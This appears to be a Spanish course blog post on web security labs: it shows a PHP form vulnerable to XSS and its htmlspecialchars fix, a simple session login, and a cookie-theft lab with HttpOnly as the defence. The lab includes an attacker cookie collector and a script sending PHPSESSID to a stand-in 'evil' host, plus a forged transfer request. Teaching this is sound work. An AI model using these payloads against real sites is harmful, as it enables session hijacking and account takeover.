---
typora-copy-images-to: ../myassets/img
typora-root-url: ../
layout: post
title:  "Seguridad Web I"
date:   2021-03-01 21:50:01 +0100
categories: PePS
---

       Diego Camañ                         Google Cloud                            PePS   

#                                                                                       SEGURIDAD WEB I



Como vamos a utilizar GitHub para gestionar cambios en los ficheros creamos en local la carpeta *validacion*

Y la metemos en GitHub

```
echo "# validacion" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/dicabel/validacion.git
git push -u origin main
```

Buscamos “docker apache php”, una vez localizado lo instalamos

```
sudo docker pull php
```

 Siguiendo las intruccuiones de  https://hub.docker.com/_/php

creamos el fichero Dockerfile

```
FROM php:7.4-cli
COPY . /usr/src/miapp
WORKDIR /usr/src/miapp
CMD [ "php", "./post.php" 
```

Incluyendo en post.php lo siguiente:

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo $_POST["textarea"] ?? "";
?>
</body>
</html>
```





Subimos los cambios a GitHub

```
git add .
git commit -m "primer post.php"
```



Construímos del docker

```
sudo docker build -t mi-php-app .
```

y lo ejecutamos

```
sudo docker run -it --rm -p 8080:80 --name webgood mi-php-app
```

```
Al ejecutarlo en el navegador si introducimos en el formulario

```

```
<script>alert('hackeado')</script>
```



Vemos que se ejecuta el script de "hackeado"



Para mitigar XSS cambiaremos nuestro `post.php`

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo htmlspecialchars($_POST["textarea"]) ?? "";
?>
</html>
```

de esta forma al introducir un script el código se convierte en simple texto



# SESIONES

Ejemplo de `login.php`

```
<?php
session_start();

//En una aplicación real, los usuarios estarían almaenados en la base de datos
$all_users = array ("mario" => "qwerty", "juan" => "123456");
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;


if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";
    
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
	if ($ya_registrado){
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
	}
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='login.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```



## Robo de sesión

Creamos dos Dockers, uno como el atacante (evil) y otro como víctima (good)

En evil crearemos `robo-de-sesion.php`

```
<?php
$session_robada = $_GET['session_robada'] ?? "";
$session_robada .= "\n";
$fichero = 'sessions.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $session_robada, FILE_APPEND);
```

y en good el atacante habrá conseguido introducir `hackeada.php`donde enviará la cookie de la víctima al atacante

```
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, envía la cookie de sesión al sitio http://evil.local 
o a http://127.0.0.1:8087/
<img src='http://127.0.0.1:8088/public_html/transfer.php?quantity=1000&user=juan'>

<script>
var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
var myImage = new Image(1,1);
myImage.src = "http://127.0.0.1:8087/public_html/robar-session.php?session_robada=" + c;
</script>
</body>
</html>
```

Si la víctima después de validarse ejecuta `hackeada.php`

el atacante puede cambiar el valor de `PHPSESSID`en la página de `login.php`con la cookie robada y suplantar al usuario legítimo.

Para evitar este robo de sesión podemos utilizar la cabecera `HttpOnly`y asegurarnos de que solo se envien cookies sobre conexiones seguras.

Modificando el inicio de `login.php`con



```
<?php
ini_set( 'session.cookie_httponly', 1 );
session_start();
```

lograremos que al visitar `hackeada.php`por parte de la víctima no envie la cookie al atacante.

